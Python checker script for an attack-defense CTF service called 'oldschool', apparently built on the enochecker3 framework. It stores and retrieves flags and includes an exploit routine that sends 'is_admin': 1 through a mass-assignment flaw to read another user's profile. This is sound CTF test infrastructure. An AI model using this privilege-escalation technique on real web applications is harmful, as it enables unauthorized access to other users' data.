from bs4 import BeautifulSoup

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in, assert_equals

from httpx import AsyncClient, Response

from logging import LoggerAdapter

from subprocess import Popen, PIPE

import string

from typing import Any, Optional

import random

import os

import re

"""
Checker config
"""

SERVICE_PORT = 9080
checker = Enochecker("oldschool", SERVICE_PORT)


def app():
    return checker.app


"""
Utility functions
"""
# TODO: add utility functions here

random.seed(int.from_bytes(os.urandom(16), "little"))
alphabet = string.ascii_letters + string.digits


def parse_flag(text: str):
    soup = BeautifulSoup(text, "html.parser")
    flag = (
        soup.find("p", string=lambda text: text and text.startswith("Flag:"))
        .get_text(strip=True)
        .split(":", 1)[1]
        .strip()
    )
    return flag


def noise(min_len: int, max_len: int):
    len = random.randint(min_len, max_len)
    return "".join(random.choice(alphabet) for _ in range(len))


def assert_status_code(
    logger: LoggerAdapter,
    r: Response,
    code: int,
    errmsg: Optional[str],
    info: Any = "",
) -> None:
    if r.status_code != code:
        logger.error(
            f"Bad http status code for "
            + f"{r.request.method} {r.request.url.path}:\n"
            + f"Info: {str(info)}\n{r.text}"
        )
        if errmsg is None:
            errmsg = f"{r.request.method} {r.request.url.path} failed"
        raise MumbleException(errmsg)


"""
Checker functions
"""


# TODO: putflag, getflag, putnoise, getnoise, exploit
# TODO: implement the putflag function next
@checker.putflag(0)
async def putflag_db(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed", info=data)

    # parse user id
    r = await client.get("/index.php?action=home")
    assert_status_code(logger, r, 200, "Get home failed")
    id_match = re.search(r'href="index\.php\?action=profile&id=(\d+)"', r.text)
    user_id = id_match.group(1)

    # update profile
    name, flag = noise(5, 16), task.flag
    data = {"username": username, "name": name, "flag": flag}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(logger, r, 200, "Update Profile failed", info=data)

    await db.set("info", (username, password, user_id))

    return f"User {username} Id {user_id} Profile updated" # This is attack info


@checker.getflag(0)
async def getflag_db(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password, user_id = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed", info=data)

    r = await client.get(f"/index.php?action=profile&id={user_id}")
    assert_status_code(logger, r, 200, "Access profile failed", info=user_id)
    flag = parse_flag(r.text)

    assert_in(task.flag, flag, "Flag missing")


# TODO: fix the flagRegex problem
@checker.exploit(0)
async def exploit_mass_assign(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 6)

    # Attack info is in the form of "User {username} Id {user_id} Profile updated"
    _, _, _, flaguser_id, _, _ = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter_"+username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed", info=data)

    # exploit mass assignment in update profile
    data = {"username": "exploiter_"+username, "is_admin": 1}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(
        logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
    )

    # get flag
    r = await client.get(f"/index.php?action=profile&id={flaguser_id}")
    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


if __name__ == "__main__":
    checker.run()
